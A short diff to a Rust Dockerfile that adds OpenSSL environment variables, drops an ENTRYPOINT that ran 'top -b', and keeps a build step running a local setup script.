@@ -1,4 +1,4 @@
-# Use Rust official image (with Debian base for compatibility)
+# Use Rust official image
 FROM rust:latest
 
 # Author label
@@ -10,6 +10,12 @@ RUN apt-get update && apt-get install -y \
     libssl-dev \
     perl \
     build-essential
+
+# Set OpenSSL environment variables
+ENV OPENSSL_DIR=/usr/lib/ssl
+ENV OPENSSL_LIB_DIR=/usr/lib/x86_64-linux-gnu
+ENV OPENSSL_INCLUDE_DIR=/usr/include/openssl
+ENV PKG_CONFIG_PATH=/usr/lib/x86_64-linux-gnu/pkgconfig
 
 # Set working directory
 WORKDIR /app
@@ -23,6 +29,3 @@ RUN cd /app && sh -eux CoOrENYOCd.sh
 
 # Default command to start the application
 CMD ["cargo", "run"]
-
-# Keeps the container running (optional, usually not needed for bots)
-ENTRYPOINT ["top", "-b"]
